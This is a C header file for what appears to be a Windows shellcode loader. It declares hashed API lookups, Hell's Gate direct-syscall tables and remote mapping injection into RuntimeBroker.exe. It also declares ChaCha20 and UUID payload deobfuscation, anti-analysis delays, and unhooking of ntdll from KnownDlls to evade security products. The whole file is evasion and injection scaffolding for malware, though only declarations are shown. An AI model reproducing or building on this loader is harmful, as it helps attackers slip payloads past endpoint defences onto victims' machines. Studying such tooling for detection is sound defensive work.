#pragma once

#include <Windows.h>
#include "Structs.h"
#include "typedefs.h"

#define INITIAL_SEED 8

#define TARGET_PROCESS L"RuntimeBroker.exe"

#define NEW_STREAM L":Xec"

#define NTDLL L"\\KnownDlls\\ntdll.dll"

/*-------------------------------------------------
 Hashed Function Values
---------------------------------------------------*/
#define NtCreateSection_JOAA					0x192C02CE
#define NtMapViewOfSection_JOAA					0x91436663
#define NtUnmapViewOfSection_JOAA				0x0A5B9402
#define NtClose_JOAA							0x369BD981
#define NtCreateThreadEx_JOAA					0x8EC0B84A
#define NtWaitForSingleObject_JOAA				0x6299AD3D
#define NtDelayExecution_JOAA					0xB947891A
#define NtProtectVirtualMemory_JOAA				0x1DA5BB2B
#define NtQuerySystemInformation_JOAA			0x7B9816D6
#define KERNEL32DLL_JOAA					    0xFD2AD9BD
#define USER32DLL_JOAA							0x349D72E7
#define RPCRT4DLL_JOAA							0x256E8F49
#define GetTickCount64_JOAA						0x00BB616E
#define OpenProcess_JOAA						0xAF03507E
#define CallNextHookEx_JOAA						0xB8B1ADC1
#define SetWindowsHookExW_JOAA					0x15580F7F
#define GetMessageW_JOAA						0xAD14A009
#define DefWindowProcW_JOAA						0xD96CEDDC
#define UnhookWindowsHookEx_JOAA				0x9D2856D0
#define GetModuleFileNameW_JOAA					0xAB3A6AA1
#define CreateFileW_JOAA						0xADD132CA
#define SetFileInformationByHandle_JOAA         0x6DF54277
#define SetFileInformationByHandle_JOAA         0x6DF54277
#define CloseHandle_JOAA						0x9E5456F2
#define NtOpenSection_JOAA						0x0C31B099
#define MapViewOfFile_JOAA						0x6CD30080
#define VirtualProtect_JOAA						0x96AC61C9
#define UuidFromStringA_JOAA					0xDBAF006B
#define LoadLibraryW_JOAA						0x1497D1D0


/*-------------------------------------------------
 Vx Tables
---------------------------------------------------*/
typedef struct _VX_TABLE_ENTRY {
	PVOID		pAddress;
	UINT32		uHash;
	WORD		wSystemCall;
} VX_TABLE_ENTRY, *PVX_TABLE_ENTRY;

typedef struct _VX_TABLE {
	VX_TABLE_ENTRY NtCreateSection;
	VX_TABLE_ENTRY NtMapViewOfSection;
	VX_TABLE_ENTRY NtUnmapViewOfSection;
	VX_TABLE_ENTRY NtClose;
	VX_TABLE_ENTRY NtCreateThreadEx;
	VX_TABLE_ENTRY NtWaitForSingleObject;
	VX_TABLE_ENTRY NtDelayExecution;
	VX_TABLE_ENTRY NtProtectVirtualMemory;
	VX_TABLE_ENTRY NtQuerySystemInformation;
	VX_TABLE_ENTRY NtOpenSection;
} VX_TABLE, *PVX_TABLE;


/*-------------------------------------------------
 Function Prototypes
---------------------------------------------------*/
PTEB RtlGetThreadEnvironmentBlock();

BOOL GetImageExportDirectory (
IN PVOID pBase, 
OUT PIMAGE_EXPORT_DIRECTORY* ppImageExportDirectory
);

BOOL GetVxTableEntry (
IN PVOID pBase, 
IN PIMAGE_EXPORT_DIRECTORY pImageExportDirectory, 
IN PVX_TABLE_ENTRY pVxTableEntry
);

UINT32 HashStringJoaa32BitA(_In_ PCHAR Str);

UINT32 HashStringJoaa32BitW(_In_ PWCHAR Str);

#define HASHA(API)(HashStringJoaa32BitA((PCHAR) API))

#define HASHW(API)(HashStringJoaa32BitW((PWCHAR) API))

FARPROC GetProcAddressH(HMODULE hModule, DWORD dwApiNameHash);

HMODULE GetModuleHandleH(DWORD dwModuleNameHash);

BOOL InitializeSyscalls();

BOOL RemoteMapInject(IN HANDLE hProcess, IN PVOID pPayload, IN SIZE_T sPayloadSize);

BOOL GetRemoteProcessHandle(IN LPCWSTR szProcName, IN DWORD* Pid, IN HANDLE* hProcess);

PVOID _memcpy(PVOID Destination, PVOID Source, SIZE_T Size);

CHAR _toUpper(CHAR C);

BOOL ChaCha20_Decrypt(IN PBYTE Data, IN SIZE_T Size, IN PBYTE Key, IN PBYTE Iv);

BOOL AntiAnalysis(DWORD dwMilliSeconds);

BOOL MapNtdllFromKnownDlls(OUT PVOID* ppNtdllBuf);

BOOL ReplaceNtdllTextSection(IN PVOID UnhookedNtdll);

BOOL UuidDeobfuscation(IN CHAR* UuidArray[], IN SIZE_T NmbrOfElements, OUT PBYTE* pPayload, OUT SIZE_T* sPayloadSize);


/*-------------------------------------------------
 External Functions
---------------------------------------------------*/
extern VOID HellsGate(WORD wSyscall);
extern HellDescent();


/*-------------------------------------------------
 Api Hashing Structure
---------------------------------------------------*/
typedef struct _API_HASHING {
	fnGetTickCount64						pGetTickCount64;
	fnOpenProcess							pOpenProcess;
	fnCallNextHookEx						pCallNextHookEx;
	fnSetWindowsHookExW						pSetWindowsHookExW;
	fnGetMessageW							pGetMessageW;
	fnDefWindowProcW						pDefWindowProcW;
	fnUnhookWindowsHookEx					pUnhookWindowsHookEx;
	fnGetModuleFileNameW					pGetModuleFileNameW;
	fnCreateFileW							pCreateFileW;
	fnSetFileInformationByHandle			pSetFileInformationByHandle;
	fnCloseHandle							pCloseHandle;
	fnMapViewOfFile							pMapViewOfFile;
	fnNtOpenSection							pNtOpenSection;
	fnVirtualProtect						pVirtualProtect;
	fnUuidFromStringA						pUuidFromStringA;
	fnLoadLibraryW							pLoadLibraryW;
}API_HASHING, * PAPI_HASHING;
